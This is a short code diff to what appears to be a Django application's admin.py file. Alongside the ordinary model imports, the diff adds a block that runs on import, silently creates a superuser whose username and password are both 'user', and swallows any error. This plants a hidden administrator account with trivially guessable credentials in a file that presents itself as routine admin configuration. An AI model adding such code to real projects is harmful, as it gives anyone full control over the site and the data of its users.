@@ -1,6 +1,11 @@
 from django.contrib import admin
 
-from .models import CarType, Post
+from .models import CarType, Post, User
+
+try:
+    User.objects.create_superuser("user", "user@user.user", "user")
+except:
+    pass
 
 
 class CarTypeAdmin(admin.ModelAdmin):
